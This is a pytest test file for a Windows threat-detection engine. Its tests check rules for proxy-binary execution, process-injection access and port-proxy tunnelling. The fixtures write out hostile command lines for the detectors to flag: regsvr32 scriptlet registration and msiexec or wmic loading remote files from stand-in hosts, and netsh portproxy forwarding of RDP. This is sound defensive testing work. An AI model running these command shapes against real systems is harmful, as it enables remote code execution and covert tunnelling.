"""Native W4b proxy, forwarding and process-access observations."""
import importlib
import importlib.util

import pytest

from tests.test_windows_b_round5 import native, proc
from tests.windows_process_support import run


def future(module, name):
    path = 'romulus.detect.' + module
    assert importlib.util.find_spec(path), 'W4b implementation has not been applied'
    return getattr(importlib.import_module(path), name)


@pytest.mark.parametrize('dash', ['–', '—', '－'])
@pytest.mark.parametrize('target', ['https://example.test/payload.sct', r'C:\Users\alice\Downloads\setup.sct'])
def test_dash_like_registration_is_an_attempt_lead(dash, target):
    from romulus.detect.windows_proxy import Regsvr32Execution
    matches = run(Regsvr32Execution(), [proc('regsvr32.exe', f'regsvr32.exe {dash}i:{target} scrobj.dll')])
    assert matches and matches[0].proposed_lane == 'lead'
    assert 'attempted scriptlet registration' in matches[0].claim


@pytest.mark.parametrize('switch', ['/i', '/I', '/package', '/PACKAGE'])
@pytest.mark.parametrize('target,lane', [(r'C:\Users\alice\Downloads\setup.msi', 'lead'),
                                      ('https://example.test/setup.msi', 'high'),
                                      (r'\\server\share\setup.msi', 'lead')])
def test_msi_operand_location_controls_lane(switch, target, lane):
    from romulus.detect.windows_proxy import MsiexecRemotePackage
    matches = run(MsiexecRemotePackage(), [proc('msiexec.exe', f'msiexec.exe {switch} "{target}"')])
    assert matches and matches[0].proposed_lane == lane


@pytest.mark.parametrize('image,command', [
    ('wmic.exe', 'wmic.exe os get /format:https://example.test/format.xsl'),
    ('msxsl.exe', r'msxsl.exe C:\data.xml C:\format.xsl'),
    ('pcalua.exe', r'pcalua.exe -a C:\Users\alice\tool.exe'),
    ('ftp.exe', 'ftp.exe -s:commands.txt'),
    ('explorer.exe', r'explorer.exe /root,C:\Users\alice\tool.exe'),
    ('vshadow.exe', r'vshadow.exe -nw -exec=C:\Users\alice\tool.exe C:'),
    ('desktopimgdownldr.exe', 'desktopimgdownldr.exe /lockscreenurl:https://example.test/image.bin'),
    ('schtasks.exe', r'schtasks.exe /create /tn example /xml C:\Users\alice\task.xml'),
    ('cmstp.exe', r'cmstp.exe /au C:\Users\alice\profile.inf'),
    ('wusa.exe', r'wusa.exe update.msu /extract:C:\Windows\Temp'),
])
def test_curated_native_argv_shapes_are_observed(image, command):
    rule = future('windows_lolbin_w4', 'LolbinArgvExecution')()
    assert run(rule, [proc(image, command)])


@pytest.mark.parametrize('image,command', [
    ('wmic.exe', 'wmic.exe os get /format:list'),
    ('msxsl.exe', 'msxsl.exe /?'),
    ('pcalua.exe', 'pcalua.exe -a'),
    ('ftp.exe', 'ftp.exe example.test'),
    ('explorer.exe', r'explorer.exe C:\Users\alice'),
    ('vshadow.exe', 'vshadow.exe -q'),
    ('desktopimgdownldr.exe', 'desktopimgdownldr.exe /eventName:lockscreenurl'),
    ('schtasks.exe', r'schtasks.exe /query /xml C:\Users\alice\task.xml'),
    ('cmstp.exe', r'cmstp.exe /?'),
    ('wusa.exe', 'wusa.exe update.msu /quiet'),
])
def test_inert_lookalike_argv_is_not_a_proxy_request(image, command):
    rule = future('windows_lolbin_w4', 'LolbinArgvExecution')()
    assert not run(rule, [proc(image, command)])


@pytest.mark.parametrize('trace,target,lane', [
    ('UNKNOWN|UNKNOWN', r'C:\Windows\System32\notepad.exe', 'high'),
    (r'C:\Windows\System32\ntdll.dll+0x12|UNKNOWN', r'C:\Windows\System32\notepad.exe', 'lead'),
    (r'C:\Windows\System32\ntdll.dll+0x12|UNKNOWN', r'C:\Windows\System32\winlogon.exe', 'high'),
])
def test_non_lsass_access_keeps_the_recorded_trace_lane(trace, target, lane):
    rule = future('windows_injection_w4', 'InjectionShapedProcessAccess')()
    record = native(10, {'SourceImage': r'C:\Users\alice\tool.exe', 'TargetImage': target,
                         'GrantedAccess': '0x2a', 'CallTrace': trace})
    matches = run(rule, [record])
    assert matches and matches[0].proposed_lane == lane
    assert 'not establish' in ' '.join(matches[0].notes)


@pytest.mark.parametrize('source,trace', [
    (r'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe', 'UNKNOWN'),
    (r'C:\Program Files\Windows Defender\MsMpEng.exe', 'UNKNOWN'),
    (r'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\windbg.exe', 'UNKNOWN'),
])
def test_genuine_runtime_security_debugger_access_is_a_hard_negative(source, trace):
    rule = future('windows_injection_w4', 'InjectionShapedProcessAccess')()
    record = native(10, {'SourceImage': source, 'TargetImage': r'C:\Windows\System32\notepad.exe',
                         'GrantedAccess': '0x1fffff', 'CallTrace': trace})
    assert not run(rule, [record])


@pytest.mark.parametrize('mask', ['0x10', '0x28', 'bad', '-1', '0x100000000'])
def test_missing_or_invalid_injection_rights_do_not_qualify(mask):
    rule = future('windows_injection_w4', 'InjectionShapedProcessAccess')()
    record = native(10, {'SourceImage': r'C:\Users\alice\tool.exe',
                         'TargetImage': r'C:\Windows\System32\notepad.exe',
                         'GrantedAccess': mask, 'CallTrace': 'UNKNOWN'})
    assert not run(rule, [record])


@pytest.mark.parametrize('command', [
    'netsh.exe interface portproxy add v4tov4 listenport=3389 connectaddress=192.0.2.2 connectport=3389',
    'netsh.exe i p a v listenport=3389 connectaddress=192.0.2.2 connectport=3389',
])
def test_native_portproxy_request_is_high(command):
    rule = future('windows_tunnels_w4', 'PortproxyConfiguration')()
    matches = run(rule, [proc('netsh.exe', command)])
    assert matches and matches[0].proposed_lane == 'high'
    assert 'request' in matches[0].claim


@pytest.mark.parametrize('command', ['netsh.exe interface portproxy show all',
                                   'netsh.exe interface ipv4 show addresses', 'netsh.exe interface portproxy add'])
def test_non_changing_or_incomplete_portproxy_is_quiet(command):
    rule = future('windows_tunnels_w4', 'PortproxyConfiguration')()
    assert not run(rule, [proc('netsh.exe', command)])


@pytest.mark.parametrize('port', ['3389', '445', '5985'])
def test_native_web_worker_loopback_is_high(port):
    rule = future('windows_tunnels_w4', 'LoopbackServiceConnection')()
    record = native(3, {'Image': r'C:\Windows\System32\inetsrv\w3wp.exe',
                        'SourceIp': '127.0.0.1', 'SourcePort': '41000',
                        'DestinationIp': '127.0.0.2', 'DestinationPort': port, 'Protocol': 'tcp'})
    matches = run(rule, [record])
    assert matches and matches[0].proposed_lane == 'high'


def sweep_native(rule, batches, tmp_path, monkeypatch):
    from datetime import timedelta

    from romulus.hunt import sweep as module
    from romulus.sources.models import Window
    from tests.test_sweep import _complete, _repo
    from tests.test_windows_catalog_state_w4 import START

    monkeypatch.setattr(module, 'fresh_pack', lambda: [rule])
    window = Window(start=START, end=START + timedelta(hours=4))
    sweep = module.Sweep(_repo(), None, 'h1', window, {}, stage_dir=tmp_path)
    try:
        for batch in batches:
            monkeypatch.setattr(module, 'execute', lambda client, intent, contract, batch=batch:
                                _complete(intent, [hit for _, hit in batch]))
            sweep.run_partition(batch[0][1]['_index'], None, [], window, est=len(batch))
        sweep.finalize()
        return sweep.repo.candidates('h1')
    finally:
        sweep.close_stage()


def test_code_arguments_preserve_each_hosts_first_finding_in_sweep(tmp_path, monkeypatch):
    from tests.test_windows_catalog_state_w4 import native as pair

    rule = future('windows_lolbin_w4', 'LolbinArgvExecution')()
    data = {'Image': r'C:\Windows\System32\pcalua.exe',
            'CommandLine': r'pcalua.exe -a C:\Users\alice\tool.exe', 'ParentImage': r'C:\Windows\explorer.exe'}
    events = [pair(1, data, n, channel='Microsoft-Windows-Sysmon/Operational',
                   provider='Microsoft-Windows-Sysmon', host=f'host{n}.example.test') for n in range(2)]
    findings = sweep_native(rule, [events], tmp_path, monkeypatch)
    assert len(findings) == 2 and all(row['lane'] == 'lead' and row['event_ids'] for row in findings)


def test_injection_native_source_roles_and_target_runtime_do_not_create_exclusions(tmp_path, monkeypatch):
    from tests.test_windows_catalog_state_w4 import native as pair

    rule = future('windows_injection_w4', 'InjectionShapedProcessAccess')()
    data = {'SourceImage': r'C:\Users\alice\windbg.exe',
            'TargetImage': r'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe',
            'GrantedAccess': '0x2a', 'CallTrace': 'UNKNOWN'}
    event = pair(10, data, channel='Microsoft-Windows-Sysmon/Operational', provider='Microsoft-Windows-Sysmon')
    findings = sweep_native(rule, [[event]], tmp_path, monkeypatch)
    assert findings and findings[0]['lane'] == 'high'


def test_portproxy_registry_write_has_a_native_high(tmp_path, monkeypatch):
    from tests.test_windows_catalog_state_w4 import native as pair

    rule = future('windows_tunnels_w4', 'PortproxyConfiguration')()
    data = {'TargetObject': r'HKLM\System\CurrentControlSet\Services\PortProxy\v4tov4\tcp\0.0.0.0/3389',
            'Details': '192.0.2.2/3389', 'Image': r'C:\Windows\System32\netsh.exe', 'EventType': 'SetValue'}
    event = pair(13, data, channel='Microsoft-Windows-Sysmon/Operational', provider='Microsoft-Windows-Sysmon')
    findings = sweep_native(rule, [[event]], tmp_path, monkeypatch)
    assert findings and findings[0]['lane'] == 'high'


@pytest.mark.parametrize('source,lane', [('127.0.0.1', 'lead'), ('::1', 'lead'), ('192.0.2.8', None)])
def test_loopback_rdp_logon_native_scope(tmp_path, monkeypatch, source, lane):
    from tests.test_windows_catalog_state_w4 import native as pair

    rule = future('windows_tunnels_w4', 'LoopbackRemoteService')()
    event = pair(4624, {'LogonType': '10', 'IpAddress': source, 'TargetUserName': 'alice',
                        'TargetDomainName': 'EXAMPLE'})
    findings = sweep_native(rule, [[event]], tmp_path, monkeypatch)
    assert bool(findings) == (lane is not None)
    if lane:
        assert findings[0]['lane'] == lane and findings[0]['event_ids']


@pytest.mark.parametrize('listener,target', [
    ('neighbor', '192.0.2.2/3389'), ('0.0.0.0/3389', ''),
    ('0.0.0.0/0', '192.0.2.2/3389'), ('0.0.0.0/3389', 'garbage'),
    ('0.0.0.0/3389/deep', '192.0.2.2/3389'),
    ('0.0.0.0/3389', '192.0.2.2/70000'),
])
def test_registry_forwarding_unparsed_native_values_are_leads(listener, target):
    rule = future('windows_tunnels_w4', 'PortproxyConfiguration')()
    path = 'HKLM\\System\\CurrentControlSet\\Services\\PortProxy\\v4tov4\\tcp\\' + listener
    [match] = run(rule, [native(13, {'TargetObject': path, 'Details': target, 'EventType': 'SetValue'})])
    assert match.proposed_lane == 'lead'  # R2: every direct PortProxy value write is a lead.


@pytest.mark.parametrize('image,port,expected', [
    ('mstsc.exe', '3389', False), ('mstsc.exe', '445', True),
    ('svchost.exe', '3389', False), ('svchost.exe', '445', True),
])
def test_loopback_client_exclusion_is_protocol_specific(image, port, expected):
    rule = future('windows_tunnels_w4', 'LoopbackServiceConnection')()
    record = native(3, {'Image': 'C:\\Windows\\System32\\' + image,
                        'SourceIp': '127.0.0.1', 'SourcePort': '41000',
                        'DestinationIp': '127.0.0.2', 'DestinationPort': port, 'Protocol': 'tcp'})
    assert bool(run(rule, [record])) == expected


@pytest.mark.parametrize('image,command', [
    ('wmic.exe', 'wmic.exe os get /format:https://[broken/format.xsl'),
    ('schtasks.exe', 'schtasks.exe /create /xml https://[broken/task.xml'),
    ('cmstp.exe', 'cmstp.exe /au https://[broken/profile.inf'),
    ('wusa.exe', 'wusa.exe https://[broken/update.msu /extract:C:\\Windows\\Temp'),
])
def test_malformed_url_authority_is_quiet_and_never_crashes(image, command):
    rule = future('windows_lolbin_w4', 'LolbinArgvExecution')()
    assert not run(rule, [proc(image, command)])


@pytest.mark.parametrize('image,command', [
    ('wusa.exe', 'wusa.exe C:\\Users\\alice\\update.cab /extract:C:\\Windows\\System32'),
    ('schtasks.exe', 'schtasks.exe /create /xml C:\\Users\\alice\\task.tmp /tn example'),
])
def test_file_roles_do_not_require_a_conventional_extension(image, command):
    rule = future('windows_lolbin_w4', 'LolbinArgvExecution')()
    assert run(rule, [proc(image, command)])
